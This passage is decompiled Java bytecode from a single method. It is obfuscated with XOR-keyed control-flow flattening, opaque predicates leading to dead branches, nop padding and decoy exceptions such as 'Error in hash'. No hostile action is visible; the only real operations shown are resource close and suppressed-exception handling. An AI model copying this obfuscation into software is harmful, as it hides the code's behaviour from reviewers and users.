    //   552: ldc_w 227476279
    //   555: if_icmpne -> 2966
    //   558: ldc_w 717259375
    //   561: iload #29
    //   563: ixor
    //   564: istore #29
    //   566: goto -> 989
    //   569: aload #10
    //   571: ifnull -> 1177
    //   574: iload #29
    //   576: bipush #31
    //   578: imul
    //   579: iconst_4
    //   580: iushr
    //   581: iload #29
    //   583: irem
    //   584: iload #29
    //   586: bipush #16
    //   588: iushr
    //   589: ixor
    //   590: ldc_w 78365877
    //   593: if_icmpne -> 2002
    //   596: ldc_w 1847570050
    //   599: iload #29
    //   601: ixor
    //   602: istore #29
    //   604: goto -> 1377
    //   607: aload #9
    //   609: invokevirtual close : ()V
    //   612: iload #29
    //   614: bipush #31
    //   616: imul
    //   617: iconst_4
    //   618: iushr
    //   619: iload #29
    //   621: irem
    //   622: iload #29
    //   624: bipush #16
    //   626: iushr
    //   627: ixor
    //   628: ldc_w 187075308
    //   631: if_icmpne -> 2296
    //   634: ldc_w 1268707083
    //   637: iload #29
    //   639: ixor
    //   640: istore #29
    //   642: goto -> 803
    //   645: iload #29
    //   647: bipush #31
    //   649: imul
    //   650: iconst_4
    //   651: iushr
    //   652: iload #29
    //   654: irem
    //   655: iload #29
    //   657: bipush #16
    //   659: iushr
    //   660: ixor
    //   661: ldc_w 123294491
    //   664: if_icmpne -> 1753
    //   667: ldc_w 658689483
    //   670: iload #29
    //   672: ixor
    //   673: istore #29
    //   675: goto -> 2022
    //   678: astore #17
    //   680: aload #10
    //   682: aload #17
    //   684: invokevirtual addSuppressed : (Ljava/lang/Throwable;)V
    //   687: iload #29
    //   689: bipush #31
    //   691: imul
    //   692: iconst_4
    //   693: iushr
    //   694: iload #29
    //   696: irem
    //   697: iload #29
    //   699: bipush #16
    //   701: iushr
    //   702: ixor
    //   703: ldc_w 218055759
    //   706: if_icmpne -> 2592
    //   709: ldc_w 1211168955
    //   712: iload #29
    //   714: ixor
    //   715: istore #29
    //   717: goto -> 1763
    //   720: aload #9
    //   722: invokevirtual close : ()V
    //   725: iload #29
    //   727: bipush #31
    //   729: imul
    //   730: iconst_4
    //   731: iushr
    //   732: iload #29
    //   734: irem
    //   735: iload #29
    //   737: bipush #16
    //   739: iushr
    //   740: ixor
    //   741: ldc_w 58948013
    //   744: if_icmpne -> 5509
    //   747: ldc_w 2059841018
    //   750: iload #29
    //   752: ixor
    //   753: istore #29
    //   755: goto -> 2659
    //   758: iload #29
    //   760: bipush #7
    //   762: bipush #29
    //   764: ishl
    //   765: iand
    //   766: bipush #29
    //   768: ishr
    //   769: iload #29
    //   771: iconst_3
    //   772: ishl
    //   773: ior
    //   774: tableswitch default -> 2306, -197381304 -> 792
    //   792: ldc_w 960108696
    //   795: iload #29
    //   797: ixor
    //   798: istore #29
    //   800: goto -> 678
    //   803: iload #29
    //   805: ldc_w 1427728765
    //   808: iload #29
    //   810: ixor
    //   811: imul
    //   812: ldc_w 1427728742
    //   815: iload #29
    //   817: ixor
    //   818: iushr
    //   819: iload #29
    //   821: irem
    //   822: iload #29
    //   824: ldc_w 1427728754
    //   827: iload #29
    //   829: ixor
    //   830: iushr
    //   831: ixor
    //   832: ldc_w 1375207510
    //   835: iload #29
    //   837: ixor
    //   838: if_icmpeq -> 865
    //   841: aconst_null
    //   842: athrow
    //   843: nop
    //   844: nop
    //   845: nop
    //   846: nop
    //   847: nop
    //   848: nop
    //   849: nop
    //   850: nop
    //   851: nop
    //   852: nop
    //   853: nop
    //   854: nop
    //   855: nop
    //   856: nop
    //   857: nop
    //   858: nop
    //   859: nop
    //   860: nop
    //   861: nop
    //   862: nop
    //   863: nop
    //   864: athrow
    //   865: new java/lang/RuntimeException
    //   868: dup
    //   869: invokespecial <init> : ()V
    //   872: athrow
    //   873: nop
    //   874: nop
    //   875: nop
    //   876: nop
    //   877: nop
    //   878: nop
    //   879: nop
    //   880: nop
    //   881: nop
    //   882: nop
    //   883: nop
    //   884: nop
    //   885: nop
    //   886: nop
    //   887: nop
    //   888: nop
    //   889: nop
    //   890: nop
    //   891: nop
    //   892: nop
    //   893: nop
    //   894: athrow
    //   895: iload #29
    //   897: bipush #7
    //   899: bipush #29
    //   901: ishl
    //   902: iand
    //   903: bipush #29
    //   905: ishr
    //   906: iload #29
    //   908: iconst_3
    //   909: ishl
    //   910: ior
    //   911: lookupswitch default -> 2338, -1463071982 -> 947, 1414981459 -> 936
    //   936: ldc_w 2046589225
    //   939: iload #29
    //   941: ixor
    //   942: istore #29
    //   944: goto -> 955
    //   947: ldc_w 1181732001
    //   950: iload #29
    //   952: ixor
    //   953: istore #29
    //   955: pop
    //   956: iload #29
    //   958: bipush #31
    //   960: imul
    //   961: iconst_4
    //   962: iushr
    //   963: iload #29
    //   965: irem
    //   966: iload #29
    //   968: bipush #16
    //   970: iushr
    //   971: ixor
    //   972: ldc_w 95810143
    //   975: if_icmpne -> 2328
    //   978: ldc_w 933622618
    //   981: iload #29
    //   983: ixor
    //   984: istore #29
    //   986: goto -> 645
    //   989: iload #29
    //   991: ldc_w 46618186
    //   994: iload #29
    //   996: ixor
    //   997: imul
    //   998: ldc_w 46618193
    //   1001: iload #29
    //   1003: ixor
    //   1004: iushr
    //   1005: iload #29
    //   1007: irem
    //   1008: iload #29
    //   1010: ldc_w 46618181
    //   1013: iload #29
    //   1015: ixor
    //   1016: iushr
    //   1017: ixor
    //   1018: ldc_w 6141053
    //   1021: iload #29
    //   1023: ixor
    //   1024: if_icmpeq -> 1051
    //   1027: aconst_null
    //   1028: athrow
    //   1029: nop
    //   1030: nop
    //   1031: nop
    //   1032: nop
    //   1033: nop
    //   1034: nop
    //   1035: nop
    //   1036: nop
    //   1037: nop
    //   1038: nop
    //   1039: nop
    //   1040: nop
    //   1041: nop
    //   1042: nop
    //   1043: nop
    //   1044: nop
    //   1045: nop
    //   1046: nop
    //   1047: nop
    //   1048: nop
    //   1049: nop
    //   1050: athrow
    //   1051: new java/lang/IllegalAccessException
    //   1054: dup
    //   1055: invokespecial <init> : ()V
    //   1058: athrow
    //   1059: nop
    //   1060: nop
    //   1061: nop
    //   1062: nop
    //   1063: nop
    //   1064: nop
    //   1065: nop
    //   1066: nop
    //   1067: nop
    //   1068: nop
    //   1069: nop
    //   1070: nop
    //   1071: nop
    //   1072: nop
    //   1073: nop
    //   1074: nop
    //   1075: nop
    //   1076: nop
    //   1077: nop
    //   1078: nop
    //   1079: nop
    //   1080: athrow
    //   1081: iload #29
    //   1083: bipush #7
    //   1085: bipush #29
    //   1087: ishl
    //   1088: iand
    //   1089: bipush #29
    //   1091: ishr
    //   1092: iload #29
    //   1094: iconst_3
    //   1095: ishl
    //   1096: ior
    //   1097: lookupswitch default -> 2360, -1842565542 -> 1124, 372945576 -> 1135
    //   1124: ldc_w 559956856
    //   1127: iload #29
    //   1129: ixor
    //   1130: istore #29
    //   1132: goto -> 1143
    //   1135: ldc_w 1910669542
    //   1138: iload #29
    //   1140: ixor
    //   1141: istore #29
    //   1143: pop
    //   1144: iload #29
    //   1146: bipush #31
    //   1148: imul
    //   1149: iconst_4
    //   1150: iushr
    //   1151: iload #29
    //   1153: irem
    //   1154: iload #29
    //   1156: bipush #16
    //   1158: iushr
    //   1159: ixor
    //   1160: ldc_w 253312223
    //   1163: if_icmpne -> 2372
    //   1166: ldc_w 86236948
    //   1169: iload #29
    //   1171: ixor
    //   1172: istore #29
    //   1174: goto -> 569
    //   1177: ldc_w 1975089282
    //   1180: iload #29
    //   1182: ixor
    //   1183: istore #29
    //   1185: goto -> 720
    //   1188: iload #29
    //   1190: ldc_w 1132975535
    //   1193: iload #29
    //   1195: ixor
    //   1196: imul
    //   1197: ldc_w 1132975540
    //   1200: iload #29
    //   1202: ixor
    //   1203: iushr
    //   1204: iload #29
    //   1206: irem
    //   1207: iload #29
    //   1209: ldc_w 1132975520
    //   1212: iload #29
    //   1214: ixor
    //   1215: iushr
    //   1216: ixor
    //   1217: ldc_w 1095809074
    //   1220: iload #29
    //   1222: ixor
    //   1223: if_icmpeq -> 1250
    //   1226: aconst_null
    //   1227: athrow
    //   1228: nop
    //   1229: nop
    //   1230: nop
    //   1231: nop
    //   1232: nop
    //   1233: nop
    //   1234: nop
    //   1235: nop
    //   1236: nop
    //   1237: nop
    //   1238: nop
    //   1239: nop
    //   1240: nop
    //   1241: nop
    //   1242: nop
    //   1243: nop
    //   1244: nop
    //   1245: nop
    //   1246: nop
    //   1247: nop
    //   1248: nop
    //   1249: athrow
    //   1250: new java/lang/RuntimeException
    //   1253: dup
    //   1254: invokespecial <init> : ()V
    //   1257: athrow
    //   1258: nop
    //   1259: nop
    //   1260: nop
    //   1261: nop
    //   1262: nop
    //   1263: nop
    //   1264: nop
    //   1265: nop
    //   1266: nop
    //   1267: nop
    //   1268: nop
    //   1269: nop
    //   1270: nop
    //   1271: nop
    //   1272: nop
    //   1273: nop
    //   1274: nop
    //   1275: nop
    //   1276: nop
    //   1277: nop
    //   1278: nop
    //   1279: athrow
    //   1280: iload #29
    //   1282: bipush #7
    //   1284: bipush #29
    //   1286: ishl
    //   1287: iand
    //   1288: bipush #29
    //   1290: ishr
    //   1291: iload #29
    //   1293: iconst_3
    //   1294: ishl
    //   1295: ior
    //   1296: lookupswitch default -> 2889, 473869698 -> 1324, 880968001 -> 1335
    //   1324: ldc_w 1714457457
    //   1327: iload #29
    //   1329: ixor
    //   1330: istore #29
    //   1332: goto -> 1343
    //   1335: ldc_w 52891369
    //   1338: iload #29
    //   1340: ixor
    //   1341: istore #29
    //   1343: pop
    //   1344: iload #29
    //   1346: bipush #31
    //   1348: imul
    //   1349: iconst_4
    //   1350: iushr
    //   1351: iload #29
    //   1353: irem
    //   1354: iload #29
    //   1356: bipush #16
    //   1358: iushr
    //   1359: ixor
    //   1360: ldc_w 152265250
    //   1363: if_icmpne -> 2901
    //   1366: ldc_w 424923818
    //   1369: iload #29
    //   1371: ixor
    //   1372: istore #29
    //   1374: goto -> 472
    //   1377: iload #29
    //   1379: ldc_w 404334394
    //   1382: iload #29
    //   1384: ixor
    //   1385: imul
    //   1386: ldc_w 404334369
    //   1389: iload #29
    //   1391: ixor
    //   1392: iushr
    //   1393: iload #29
    //   1395: irem
    //   1396: iload #29
    //   1398: ldc_w 404334389
    //   1401: iload #29
    //   1403: ixor
    //   1404: iushr
    //   1405: ixor
    //   1406: ldc_w 380112107
    //   1409: iload #29
    //   1411: ixor
    //   1412: if_icmpeq -> 1439
    //   1415: aconst_null
    //   1416: athrow
    //   1417: nop
    //   1418: nop
    //   1419: nop
    //   1420: nop
    //   1421: nop
    //   1422: nop
    //   1423: nop
    //   1424: nop
    //   1425: nop
    //   1426: nop
    //   1427: nop
    //   1428: nop
    //   1429: nop
    //   1430: nop
    //   1431: nop
    //   1432: nop
    //   1433: nop
    //   1434: nop
    //   1435: nop
    //   1436: nop
    //   1437: nop
    //   1438: athrow
    //   1439: new java/lang/RuntimeException
    //   1442: dup
    //   1443: invokespecial <init> : ()V
    //   1446: athrow
    //   1447: nop
    //   1448: nop
    //   1449: nop
    //   1450: nop
    //   1451: nop
    //   1452: nop
    //   1453: nop
    //   1454: nop
    //   1455: nop
    //   1456: nop
    //   1457: nop
    //   1458: nop
    //   1459: nop
    //   1460: nop
    //   1461: nop
    //   1462: nop
    //   1463: nop
    //   1464: nop
    //   1465: nop
    //   1466: nop
    //   1467: nop
    //   1468: athrow
    //   1469: iload #29
    //   1471: bipush #7
    //   1473: bipush #29
    //   1475: ishl
    //   1476: iand
    //   1477: bipush #29
    //   1479: ishr
    //   1480: iload #29
    //   1482: iconst_3
    //   1483: ishl
    //   1484: ior
    //   1485: lookupswitch default -> 2996, -1060292312 -> 1523, -655458294 -> 1512
    //   1512: ldc_w 1582331674
    //   1515: iload #29
    //   1517: ixor
    //   1518: istore #29
    //   1520: goto -> 1531
    //   1523: ldc_w 492044350
    //   1526: iload #29
    //   1528: ixor
    //   1529: istore #29
    //   1531: pop
    //   1532: iload #29
    //   1534: bipush #31
    //   1536: imul
    //   1537: iconst_4
    //   1538: iushr
    //   1539: iload #29
    //   1541: irem
    //   1542: iload #29
    //   1544: bipush #16
    //   1546: iushr
    //   1547: ixor
    //   1548: ldc_w 83413476
    //   1551: if_icmpne -> 2986
    //   1554: ldc_w 466231666
    //   1557: iload #29
    //   1559: ixor
    //   1560: istore #29
    //   1562: goto -> 607
    //   1565: iload #29
    //   1567: ldc_w 2057148062
    //   1570: iload #29
    //   1572: ixor
    //   1573: imul
    //   1574: ldc_w 2057148037
    //   1577: iload #29
    //   1579: ixor
    //   1580: iushr
    //   1581: iload #29
    //   1583: irem
    //   1584: iload #29
    //   1586: ldc_w 2057148049
    //   1589: iload #29
    //   1591: ixor
    //   1592: iushr
    //   1593: ixor
    //   1594: ldc_w 1997324165
    //   1597: iload #29
    //   1599: ixor
    //   1600: if_icmpeq -> 1627
    //   1603: aconst_null
    //   1604: athrow
    //   1605: nop
    //   1606: nop
    //   1607: nop
    //   1608: nop
    //   1609: nop
    //   1610: nop
    //   1611: nop
    //   1612: nop
    //   1613: nop
    //   1614: nop
    //   1615: nop
    //   1616: nop
    //   1617: nop
    //   1618: nop
    //   1619: nop
    //   1620: nop
    //   1621: nop
    //   1622: nop
    //   1623: nop
    //   1624: nop
    //   1625: nop
    //   1626: athrow
    //   1627: new java/lang/IllegalAccessException
    //   1630: dup
    //   1631: invokespecial <init> : ()V
    //   1634: athrow
    //   1635: nop
    //   1636: nop
    //   1637: nop
    //   1638: nop
    //   1639: nop
    //   1640: nop
    //   1641: nop
    //   1642: nop
    //   1643: nop
    //   1644: nop
    //   1645: nop
    //   1646: nop
    //   1647: nop
    //   1648: nop
    //   1649: nop
    //   1650: nop
    //   1651: nop
    //   1652: nop
    //   1653: nop
    //   1654: nop
    //   1655: nop
    //   1656: athrow
    //   1657: iload #29
    //   1659: bipush #7
    //   1661: bipush #29
    //   1663: ishl
    //   1664: iand
    //   1665: bipush #29
    //   1667: ishr
    //   1668: iload #29
    //   1670: iconst_3
    //   1671: ishl
    //   1672: ior
    //   1673: lookupswitch default -> 2264, -722684917 -> 1700, -133378416 -> 1711
    //   1700: ldc_w 1104287191
    //   1703: iload #29
    //   1705: ixor
    //   1706: istore #29
    //   1708: goto -> 1719
    //   1711: ldc_w 609098372
    //   1714: iload #29
    //   1716: ixor
    //   1717: istore #29
    //   1719: pop
    //   1720: iload #29
    //   1722: bipush #31
    //   1724: imul
    //   1725: iconst_4
    //   1726: iushr
    //   1727: iload #29
    //   1729: irem
    //   1730: iload #29
    //   1732: bipush #16
    //   1734: iushr
    //   1735: ixor
    //   1736: ldc_w 48903481
    //   1739: if_icmpne -> 2276
    //   1742: ldc_w 323508076
    //   1745: iload #29
    //   1747: ixor
    //   1748: istore #29
    //   1750: goto -> 531
    //   1753: new java/lang/RuntimeException
    //   1756: astore_3
    //   1757: aload_3
    //   1758: invokespecial <init> : ()V
    //   1761: aload_3
    //   1762: athrow
    //   1763: iload #29
    //   1765: ldc_w 1871537749
    //   1768: iload #29
    //   1770: ixor
    //   1771: imul
    //   1772: ldc_w 1871537742
    //   1775: iload #29
    //   1777: ixor
    //   1778: iushr
    //   1779: iload #29
    //   1781: irem
    //   1782: iload #29
    //   1784: ldc_w 1871537754
    //   1787: iload #29
    //   1789: ixor
    //   1790: iushr
    //   1791: ixor
    //   1792: ldc_w 1739390952
    //   1795: iload #29
    //   1797: ixor
    //   1798: if_icmpeq -> 1825
    //   1801: aconst_null
    //   1802: athrow
    //   1803: nop
    //   1804: nop
    //   1805: nop
    //   1806: nop
    //   1807: nop
    //   1808: nop
    //   1809: nop
    //   1810: nop
    //   1811: nop
    //   1812: nop
    //   1813: nop
    //   1814: nop
    //   1815: nop
    //   1816: nop
    //   1817: nop
    //   1818: nop
    //   1819: nop
    //   1820: nop
    //   1821: nop
    //   1822: nop
    //   1823: nop
    //   1824: athrow
    //   1825: new java/lang/IllegalAccessException
    //   1828: dup
    //   1829: invokespecial <init> : ()V
    //   1832: athrow
    //   1833: nop
    //   1834: nop
    //   1835: nop
    //   1836: nop
    //   1837: nop
    //   1838: nop
    //   1839: nop
    //   1840: nop
    //   1841: nop
    //   1842: nop
    //   1843: nop
    //   1844: nop
    //   1845: nop
    //   1846: nop
    //   1847: nop
    //   1848: nop
    //   1849: nop
    //   1850: nop
    //   1851: nop
    //   1852: nop
    //   1853: nop
    //   1854: athrow
    //   1855: iload #29
    //   1857: bipush #7
    //   1859: bipush #29
    //   1861: ishl
    //   1862: iand
    //   1863: bipush #29
    //   1865: ishr
    //   1866: iload #29
    //   1868: iconst_3
    //   1869: ishl
    //   1870: ior
    //   1871: lookupswitch default -> 1896, -1195637999 -> 1908, 2087400019 -> 1919
    //   1896: new java/io/IOException
    //   1899: astore_3
    //   1900: aload_3
    //   1901: ldc 'Error in hash'
    //   1903: invokespecial <init> : (Ljava/lang/String;)V
    //   1906: aload_3
    //   1907: athrow
    //   1908: ldc_w 187846975
    //   1911: iload #29
    //   1913: ixor
    //   1914: istore #29
    //   1916: goto -> 1927
    //   1919: ldc_w 1403565847
    //   1922: iload #29
    //   1924: ixor
    //   1925: istore #29
    //   1927: pop
    //   1928: iload #29
    //   1930: bipush #31
    //   1932: imul
    //   1933: iconst_4
    //   1934: iushr
    //   1935: iload #29
    //   1937: irem
    //   1938: iload #29
    //   1940: bipush #16
    //   1942: iushr
    //   1943: ixor
    //   1944: ldc_w 76118401
    //   1947: if_icmpne -> 1961
    //   1950: ldc_w 1800834836
    //   1953: iload #29
    //   1955: ixor
    //   1956: istore #29
    //   1958: goto -> 2931
    //   1961: new java/lang/RuntimeException
    //   1964: astore_3
    //   1965: aload_3
    //   1966: invokespecial <init> : ()V
    //   1969: aload_3
    //   1970: athrow
    //   1971: nop
    //   1972: nop
    //   1973: nop
    //   1974: athrow
    //   1975: nop
    //   1976: nop
    //   1977: nop
    //   1978: nop
    //   1979: nop
    //   1980: athrow
    //   1981: nop
    //   1982: nop
    //   1983: nop
    //   1984: athrow
    //   1985: nop
    //   1986: nop
    //   1987: nop
    //   1988: nop
    //   1989: nop
    //   1990: athrow
    //   1991: ldc_w 2138344051
    //   1994: iload #29
    //   1996: ixor
    //   1997: istore #29
    //   1999: goto -> 2931
    //   2002: new java/lang/RuntimeException
    //   2005: astore_3
    //   2006: aload_3
    //   2007: invokespecial <init> : ()V
    //   2010: aload_3
    //   2011: athrow
    //   2012: new java/lang/RuntimeException
    //   2015: astore_3
    //   2016: aload_3
    //   2017: invokespecial <init> : ()V
    //   2020: aload_3
    //   2021: athrow
    //   2022: iload #29
    //   2024: ldc_w 59874125
    //   2027: iload #29
    //   2029: ixor
    //   2030: imul
    //   2031: ldc_w 59874134
    //   2034: iload #29
    //   2036: ixor
    //   2037: iushr
    //   2038: iload #29
    //   2040: irem
    //   2041: iload #29
    //   2043: ldc_w 59874114
    //   2046: iload #29
    //   2048: ixor
    //   2049: iushr
    //   2050: ixor
    //   2051: ldc_w 13179231
    //   2054: iload #29
    //   2056: ixor
    //   2057: if_icmpeq -> 2084
    //   2060: aconst_null
    //   2061: athrow
    //   2062: nop
    //   2063: nop
    //   2064: nop
    //   2065: nop
    //   2066: nop
    //   2067: nop
    //   2068: nop
    //   2069: nop
    //   2070: nop
    //   2071: nop
    //   2072: nop
    //   2073: nop
    //   2074: nop
    //   2075: nop
    //   2076: nop
    //   2077: nop
    //   2078: nop
    //   2079: nop
    //   2080: nop
    //   2081: nop
    //   2082: nop
    //   2083: athrow
    //   2084: new java/lang/RuntimeException
    //   2087: dup
    //   2088: invokespecial <init> : ()V
    //   2091: athrow
    //   2092: nop
    //   2093: nop
    //   2094: nop
    //   2095: nop
    //   2096: nop
    //   2097: nop
    //   2098: nop
    //   2099: nop
    //   2100: nop
    //   2101: nop
    //   2102: nop
    //   2103: nop
    //   2104: nop
    //   2105: nop
    //   2106: nop
    //   2107: nop
    //   2108: nop
    //   2109: nop
    //   2110: nop
    //   2111: nop
    //   2112: nop
    //   2113: athrow
    //   2114: nop
    //   2115: nop
    //   2116: nop
    //   2117: athrow
    //   2118: nop
    //   2119: nop
    //   2120: nop
    //   2121: nop
    //   2122: nop
    //   2123: athrow
    //   2124: nop
    //   2125: nop
    //   2126: nop
    //   2127: athrow
    //   2128: nop
    //   2129: nop
    //   2130: nop
    //   2131: nop
    //   2132: nop
    //   2133: athrow
    //   2134: iload #29
    //   2136: bipush #7
    //   2138: bipush #29
    //   2140: ishl
    //   2141: iand
    //   2142: bipush #29
    //   2144: ishr
    //   2145: iload #29
    //   2147: iconst_3
    //   2148: ishl
    //   2149: ior
    //   2150: lookupswitch default -> 2198, -2104767029 -> 2176, 478993040 -> 2187
    //   2176: ldc_w 1959347728
    //   2179: iload #29
    //   2181: ixor
    //   2182: istore #29
    //   2184: goto -> 2210
    //   2187: ldc_w 118072571
    //   2190: iload #29
    //   2192: ixor
    //   2193: istore #29
    //   2195: goto -> 2210
    //   2198: new java/io/IOException
    //   2201: astore_3
    //   2202: aload_3
    //   2203: ldc 'Error in hash'
    //   2205: invokespecial <init> : (Ljava/lang/String;)V
    //   2208: aload_3
    //   2209: athrow
    //   2210: pop
    //   2211: iload #29
    //   2213: bipush #31
    //   2215: imul
    //   2216: iconst_4
    //   2217: iushr
    //   2218: iload #29
    //   2220: irem
    //   2221: iload #29
    //   2223: bipush #16
    //   2225: iushr
    //   2226: ixor
    //   2227: ldc_w 72269622
    //   2230: if_icmpne -> 2244
    //   2233: ldc_w 1407934944
    //   2236: iload #29
    //   2238: ixor
    //   2239: istore #29
    //   2241: goto -> 2931
    //   2244: new java/lang/RuntimeException
    //   2247: astore_3
    //   2248: aload_3
    //   2249: invokespecial <init> : ()V
    //   2252: aload_3
    //   2253: athrow
    //   2254: nop
    //   2255: nop
    //   2256: nop
    //   2257: athrow
    //   2258: nop
    //   2259: nop
    //   2260: nop
    //   2261: nop
    //   2262: nop
    //   2263: athrow
    //   2264: new java/lang/IllegalAccessException
    //   2267: astore_3
    //   2268: aload_3
    //   2269: ldc 'Error in hash'
    //   2271: invokespecial <init> : (Ljava/lang/String;)V
    //   2274: aload_3
    //   2275: athrow
    //   2276: new java/lang/RuntimeException
    //   2279: astore_3
    //   2280: aload_3
    //   2281: invokespecial <init> : ()V
    //   2284: aload_3
    //   2285: athrow
    //   2286: nop
    //   2287: nop
    //   2288: nop
    //   2289: athrow
    //   2290: nop
    //   2291: nop
    //   2292: nop
    //   2293: nop
    //   2294: nop
    //   2295: athrow
    //   2296: new java/lang/RuntimeException
    //   2299: astore_3
    //   2300: aload_3
    //   2301: invokespecial <init> : ()V
    //   2304: aload_3
    //   2305: athrow
    //   2306: new java/io/IOException
    //   2309: astore_3
    //   2310: aload_3
    //   2311: ldc 'Error in hash'
    //   2313: invokespecial <init> : (Ljava/lang/String;)V
    //   2316: aload_3
    //   2317: athrow
    //   2318: nop
    //   2319: nop
    //   2320: nop
    //   2321: athrow
    //   2322: nop
    //   2323: nop
    //   2324: nop
    //   2325: nop
    //   2326: nop
    //   2327: athrow
    //   2328: new java/io/IOException
    //   2331: astore_3
    //   2332: aload_3
    //   2333: invokespecial <init> : ()V
    //   2336: aload_3
    //   2337: athrow
    //   2338: new java/io/IOException
    //   2341: astore_3
    //   2342: aload_3
    //   2343: ldc 'Error in hash'
    //   2345: invokespecial <init> : (Ljava/lang/String;)V
    //   2348: aload_3
    //   2349: athrow
    //   2350: nop
    //   2351: nop
    //   2352: nop
    //   2353: athrow
    //   2354: nop
    //   2355: nop
    //   2356: nop
    //   2357: nop
    //   2358: nop
    //   2359: athrow
    //   2360: new java/io/IOException
    //   2363: astore_3
    //   2364: aload_3
    //   2365: ldc 'Error in hash'
    //   2367: invokespecial <init> : (Ljava/lang/String;)V
    //   2370: aload_3
    //   2371: athrow
    //   2372: new java/lang/IllegalAccessException
    //   2375: astore_3
    //   2376: aload_3
    //   2377: invokespecial <init> : ()V
    //   2380: aload_3
    //   2381: athrow
    //   2382: nop
    //   2383: nop
    //   2384: nop
    //   2385: athrow
    //   2386: nop
    //   2387: nop
    //   2388: nop
    //   2389: nop
    //   2390: nop
    //   2391: athrow
    //   2392: nop
    //   2393: nop
    //   2394: nop
    //   2395: athrow
    //   2396: nop
    //   2397: nop
    //   2398: nop
    //   2399: nop
    //   2400: nop
    //   2401: athrow
    //   2402: iload #29
    //   2404: bipush #7
    //   2406: bipush #29
    //   2408: ishl
    //   2409: iand
    //   2410: bipush #29
    //   2412: ishr
    //   2413: iload #29
    //   2415: iconst_3
    //   2416: ishl
    //   2417: ior
    //   2418: lookupswitch default -> 2558, -1833776365 -> 2492, -1339011781 -> 2536, -417045671 -> 2503, -197381304 -> 2581, 503023912 -> 2514, 647673033 -> 2570, 1038940041 -> 2547, 1077846481 -> 2525
    //   2492: ldc_w 1941153303
    //   2495: iload #29
    //   2497: ixor
    //   2498: istore #29
    //   2500: goto -> 5252
    //   2503: ldc_w 1023505182
    //   2506: iload #29
    //   2508: ixor
    //   2509: istore #29
    //   2511: goto -> 5252
    //   2514: ldc_w 39489104
    //   2517: iload #29
    //   2519: ixor
    //   2520: istore #29
    //   2522: goto -> 5252
    //   2525: ldc_w 702688079
    //   2528: iload #29
    //   2530: ixor
    //   2531: istore #29
    //   2533: goto -> 5252
    //   2536: ldc_w 2011428562
    //   2539: iload #29
    //   2541: ixor
    //   2542: istore #29
    //   2544: goto -> 5252
    //   2547: ldc_w 643326340
    //   2550: iload #29
    //   2552: ixor
    //   2553: istore #29
    //   2555: goto -> 5252
    //   2558: new java/io/IOException
    //   2561: astore_3
    //   2562: aload_3
    //   2563: ldc 'Error in hash'
    //   2565: invokespecial <init> : (Ljava/lang/String;)V
    //   2568: aload_3
    //   2569: athrow
    //   2570: ldc_w 624339436
    //   2573: iload #29
    //   2575: ixor
    //   2576: istore #29
    //   2578: goto -> 5252
    //   2581: ldc_w 526547228
    //   2584: iload #29
    //   2586: ixor
    //   2587: istore #29
    //   2589: goto -> 5252
    //   2592: new java/io/IOException
    //   2595: astore_3
    //   2596: aload_3
    //   2597: invokespecial <init> : ()V
    //   2600: aload_3
    //   2601: athrow
    //   2602: iload #29
    //   2604: bipush #7
    //   2606: bipush #29
    //   2608: ishl
    //   2609: iand
    //   2610: bipush #29
    //   2612: ishr
    //   2613: iload #29
    //   2615: iconst_3
    //   2616: ishl
    //   2617: ior
    //   2618: tableswitch default -> 2647, -417045671 -> 2636
    //   2636: ldc_w 25266147
    //   2639: iload #29
    //   2641: ixor
    //   2642: istore #29
    //   2644: goto -> 3075
    //   2647: new java/lang/IllegalAccessException
    //   2650: astore_3
    //   2651: aload_3
    //   2652: ldc 'Error in hash'
    //   2654: invokespecial <init> : (Ljava/lang/String;)V
    //   2657: aload_3
    //   2658: athrow
    //   2659: iload #29
    //   2661: ldc_w 2038029504
    //   2664: iload #29
    //   2666: ixor
    //   2667: imul
    //   2668: ldc_w 2038029531
    //   2671: iload #29
    //   2673: ixor
    //   2674: iushr
    //   2675: iload #29
    //   2677: irem
    //   2678: iload #29
    //   2680: ldc_w 2038029519
    //   2683: iload #29
    //   2685: ixor
    //   2686: iushr
    //   2687: ixor
    //   2688: ldc_w 1915076182
    //   2691: iload #29
    //   2693: ixor
    //   2694: if_icmpeq -> 2721
    //   2697: aconst_null
    //   2698: athrow
    //   2699: nop
    //   2700: nop
    //   2701: nop
    //   2702: nop
    //   2703: nop
    //   2704: nop
    //   2705: nop
    //   2706: nop
    //   2707: nop
    //   2708: nop
    //   2709: nop
    //   2710: nop
    //   2711: nop
    //   2712: nop
    //   2713: nop
    //   2714: nop
    //   2715: nop
    //   2716: nop
    //   2717: nop
    //   2718: nop
    //   2719: nop
    //   2720: athrow
    //   2721: new java/lang/IllegalAccessException
    //   2724: dup
    //   2725: invokespecial <init> : ()V
    //   2728: athrow
    //   2729: nop
    //   2730: nop
    //   2731: nop
    //   2732: nop
    //   2733: nop
    //   2734: nop
    //   2735: nop
    //   2736: nop
    //   2737: nop
    //   2738: nop
    //   2739: nop
    //   2740: nop
    //   2741: nop
    //   2742: nop
    //   2743: nop
    //   2744: nop
    //   2745: nop
    //   2746: nop
    //   2747: nop
    //   2748: nop
    //   2749: nop
    //   2750: athrow
    //   2751: nop
    //   2752: nop
    //   2753: nop
    //   2754: athrow
    //   2755: nop
    //   2756: nop
    //   2757: nop
    //   2758: nop
    //   2759: nop
    //   2760: athrow
    //   2761: iload #29
    //   2763: bipush #7
    //   2765: bipush #29
    //   2767: ishl
    //   2768: iand
    //   2769: bipush #29
    //   2771: ishr
    //   2772: iload #29
    //   2774: iconst_3
    //   2775: ishl
    //   2776: ior
    //   2777: lookupswitch default -> 2867, -875632901 -> 2815, 469395433 -> 2804
    //   2804: ldc_w 1661848555
    //   2807: iload #29
    //   2809: ixor
    //   2810: istore #29
    //   2812: goto -> 2823
    //   2815: ldc_w 957045705
    //   2818: iload #29
    //   2820: ixor
    //   2821: istore #29
    //   2823: pop
    //   2824: iload #29
    //   2826: bipush #31
    //   2828: imul
    //   2829: iconst_4
    //   2830: iushr
    //   2831: iload #29
    //   2833: irem
    //   2834: iload #29
    //   2836: bipush #16
    //   2838: iushr
    //   2839: ixor
    //   2840: ldc_w 215852488
    //   2843: if_icmpne -> 2857
    //   2846: ldc_w 385997151
    //   2849: iload #29
    //   2851: ixor
    //   2852: istore #29
    //   2854: goto -> 2931
    //   2857: new java/lang/RuntimeException
    //   2860: astore_3
    //   2861: aload_3
    //   2862: invokespecial <init> : ()V
    //   2865: aload_3
    //   2866: athrow
    //   2867: new java/lang/IllegalAccessException
    //   2870: astore_3
    //   2871: aload_3
    //   2872: ldc 'Error in hash'
    //   2874: invokespecial <init> : (Ljava/lang/String;)V
    //   2877: aload_3
    //   2878: athrow
    //   2879: nop
